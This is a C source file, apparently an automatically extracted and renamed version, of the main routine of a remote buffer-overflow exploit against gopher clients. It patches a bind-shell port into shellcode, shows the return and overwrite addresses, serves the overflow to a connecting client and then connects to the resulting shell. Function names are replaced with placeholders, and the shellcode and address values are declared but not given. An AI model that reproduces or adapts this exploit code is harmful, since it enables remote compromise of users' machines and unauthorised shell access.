#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 unsigned short DFL_BINDSHELL_PORT ; 
 int PLACEMENT_OFFSET ; 
 int REPLACE_VI_ADDR ; 
 int RET_ADDR ; 
 unsigned short FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (char*,unsigned short) ; 
 char* FUNC3 (unsigned short) ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 unsigned short* x86_exec ; 

int FUNC6(int argc,char **argv){
unsigned short port=0,sport=DFL_BINDSHELL_PORT;
char *hostptr;
FUNC4("[*] gopher[v3.0.9+]: remote (client) buffer overflow exp"
"loit.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
if(argc<2){
FUNC4("[!] syntax: %s <port> [bindshell port]\n",argv[0]);
FUNC1(1);
}
port=FUNC0(argv[1]);
if(argc>2)sport=FUNC0(argv[2]);

/* set the port to bind to in the shellcode. */
x86_exec[20]=(sport&0xff00)>>8;
x86_exec[21]=(sport&0x00ff);

/* verbose values display. */
FUNC4("[*] replacement \"vi\" address\t\t: 0x%.8x\n",REPLACE_VI_ADDR);
FUNC4("[*] return address\t\t\t: 0x%.8x\n",RET_ADDR);
FUNC4("[*] offset from the end of tmpstr[]\t: %d (=%d)\n",
PLACEMENT_OFFSET,PLACEMENT_OFFSET*4);
FUNC4("[*] server port\t\t\t\t: %u\n",port);
FUNC4("[*] bindshell port\t\t\t: %u\n\n",sport);

/* wait for a connection and send overflow. */
hostptr=FUNC3(port);

/* be safe, and give it time to run. */
FUNC5(3);

/* see if a shell spawned. */
FUNC2(hostptr,sport);

FUNC1(0);
}